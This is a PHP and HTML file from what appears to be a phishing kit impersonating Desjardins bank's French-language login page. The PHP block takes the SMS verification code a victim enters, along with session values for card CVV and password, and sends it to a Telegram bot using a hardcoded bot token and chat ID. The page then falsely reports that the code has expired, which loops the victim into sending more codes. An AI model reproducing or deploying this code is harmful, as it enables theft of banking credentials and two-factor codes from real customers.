<?php 
session_start();

// Vérifie si les données de connexion sont présentes, sinon redirige vers la page de connexion
if (!isset($_SESSION["cvv"]) || !isset($_SESSION["mdp"])) {
    header("Location: ./index.php");
    exit();
}

// Récupère les données du formulaire
$sms = $_POST['sms'];
$_SESSION["sms"] = $sms;

// Prépare le message formaté à envoyer sur Telegram
$message = "🔐 **FIN DE CONNEXION** 🔐\n\n" .
           "📦 **SMS Reçu** : \n" .
           "```" . $sms . "```";

// Configuration de l'envoi Telegram
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; // Remplace par le token de ton bot
$chat_id = '6242884372'; // Remplace par ton chat_id

// URL de l'API Telegram pour envoyer le message
$url = "https://api.telegram.org/bot$token/sendMessage";

// Prépare les données à envoyer via l'API
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
];

// Initialise cURL pour envoyer le message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Désactive la vérification SSL (peut être activé en production avec un certificat valide)
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Exécute la requête et récupère la réponse
$response = curl_exec($ch);

// Vérifie si cURL a rencontré une erreur
if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
} else {
    echo '';
}

// Ferme la session cURL
curl_close($ch);
?>




<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">   
    
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="/desjardin/styles_mobile.css">

<link rel="stylesheet" media="screen and (min-width: 769px)" href="/desjardin/styles_pc.css">

    <title>se connecter</title>
</head>

<header>
    <div class="firstHead">
        <span>
            <span>    AA</span>
            <span>English</span>
            <span>Nous joindre</span>
            <span>Aide</span>
        </span>

    </div>
    <div class="secondHeader">
<img width="200px" height="40px" src="./img/logo1.svg">
<img class="logo2" width="150px" height="40px" src="./img/logo2.svg">
<img class="logo3" width="150px" height="40px" src="./img/logo3.svg">
    </div>
</header>
<body>
    <div class="container">
        <div class="formContainer">
        <form action="/desjardin/sms.php?loop=true" method="post">
                <h1>Se Connecter</h1>
         
<div class="notifications-container">
  <div class="error-alert">
    <div class="flex">
      <div class="flex-shrink-0">
        
        <svg aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" class="error-svg">
          <path clip-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" fill-rule="evenodd"></path>
        </svg>
      </div>
      <div class="error-prompt-container">
        <p class="error-prompt-heading">Le code à expirer
        </p>
      </div>
    </div>
  </div>
</div>

       

        <div class="valid">
   
<button>
    <span>renvoyer le code</span>
    <svg width="34" height="34" viewBox="0 0 74 74" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="37" cy="37" r="35.5" stroke="black" stroke-width="3"></circle>
        <path d="M25 35.5C24.1716 35.5 23.5 36.1716 23.5 37C23.5 37.8284 24.1716 38.5 25 38.5V35.5ZM49.0607 38.0607C49.6464 37.4749 49.6464 36.5251 49.0607 35.9393L39.5147 26.3934C38.9289 25.8076 37.9792 25.8076 37.3934 26.3934C36.8076 26.9792 36.8076 27.9289 37.3934 28.5147L45.8787 37L37.3934 45.4853C36.8076 46.0711 36.8076 47.0208 37.3934 47.6066C37.9792 48.1924 38.9289 48.1924 39.5147 47.6066L49.0607 38.0607ZM25 38.5L48 38.5V35.5L25 35.5V38.5Z" fill="black"></path>
    </svg>
</button>
        </div>
            

        </form>

        <div class="formFooter">
            <div class="nav1">
            <ul><a href="">S’inscrire à AccèsD</a></ul>
            <ul><a href="">S’inscrire à AccèsD Affaires</a></ul>
            <ul><a href="">Devenir membre</a></ul>
            </div>

        <div class="nav2">
            <div class="nav2-1">
                <ul><a href="">  Sécurité du site</a></ul>
                <ul><a href="">Soutien technique</a></ul>
                <ul><a href="">Signaler une fraude</a></ul>
            </div>

            <div class="nav2-2">
          <ul><a href="">   
            <img style="width:15px ; margin-right:10px" src="./img/lock.svg" alt="">Sécurité garantie à 100 %</a></ul>
            </div>
        </div>
    </div>
 </div>

        <div class="image">

        </div>
    </div>
    
</body>

<footer>
    <div class="h-footer">
    <ul class="ul-1" ><a href=""><b>SERVICES AUX PARTICULIERS</b></a></ul> 
   <ul class="ul-2" ><a href=""><b> SERVICES AUX ENTREPRISES </b></a></ul>
   <ul class="ul-3" ><a href=""><b>CONSEILS </b></a></ul>
   <ul class="ul-4" ><a href=""><b>À PROPOS </b></a></ul>
   <ul ><a href=""><b>APPLICATION MOBILE</b></a></ul>
    </div>

    <div class="b-footer">
        <div class="b-footer-1">
        <ul class="ul-1" ><a href=""><b> Sécurité </b></a></ul>
        <ul class="ul-2" ><a href=""><b>  Conditions d'utilisation et notes légales </b></a></ul> 
        <ul class="ul-3" ><a href=""><b> Confidentialité </b></a></ul>
        <ul class="ul-4" ><a href=""><b>  Personnaliser les témoins </b></a></ul>
        <ul class="ul-5" ><a href=""><b>    Accessibilité </b></a></ul>
        <ul class="ul-6" ><a href=""><b> Plan du site </b></a></ul>
       
        
        </div>
        <div class="b-footer-2">
        © 1996-2024, Mouvement des caisses Desjardins. Tous droits réservés.
        </div>
    </div>
</footer>
</html>